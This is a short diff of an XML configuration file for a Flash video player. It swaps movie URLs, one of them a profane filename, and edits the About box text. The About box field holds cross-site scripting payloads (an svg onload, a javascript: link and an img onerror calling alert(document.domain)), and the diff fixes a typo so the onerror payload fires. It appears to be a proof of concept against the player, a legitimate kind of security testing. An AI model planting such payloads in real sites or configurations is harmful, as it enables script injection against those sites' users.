@@ -2,17 +2,17 @@
 <AutoStart>1</AutoStart>
 <MovieWidth>640</MovieWidth>
 <MovieHeight>480</MovieHeight>
-<BackgroundColor>FFFFFF</BackgroundColor>
-<MovieURL>http://thebest404pageever.com/swf/FUUUUUUUUUUUUUUUUUUUUUUUUUCK.swf</MovieURL>
+<BackgroundColor>000000</BackgroundColor>
+<MovieURL>http://thebest404pageever.com/swf/sunnyday.swf</MovieURL>
 <ShowLoadingMov>1</ShowLoadingMov>
-<LoadingMovURL>http://thebest404pageever.com/swf/FUUUUUUUUUUUUUUUUUUUUUUUUUCK.swf</LoadingMovURL>
+<LoadingMovURL>http://thebest404pageever.com/swf/sunnyday.swf</LoadingMovURL>
 <ScaleLoadingMov>1</ScaleLoadingMov>
 <LoadingMovPercentToLoad>50</LoadingMovPercentToLoad>
 <LoadingMovMinDuration>3</LoadingMovMinDuration>
 <ControllerColor>C0C0C0</ControllerColor>
 <ShowFFRW>1</ShowFFRW>
 <ShowAbout>1</ShowAbout>
-<AboutBoxText><![CDATA[<svg onload='javascript:alert(document.domain)'></svg><a href='javascript:alert(document.domain)'> CLICK HERE</a> <img src='x' onerror='javascritp:alert(document.domain)'> </img>]]></AboutBoxText>
+<AboutBoxText><![CDATA[<svg onload='javascript:alert(document.domain)'><a href='javascript:alert(document.domain)'> CLICK HERE</a> <img src='x' onerror='javascript:alert(document.domain)'>]]></AboutBoxText>
 <TimeDisplayFormat>MM:SS</TimeDisplayFormat>
 <ShowDuration>1</ShowDuration>
 <ShowElapsedTime>1</ShowElapsedTime>
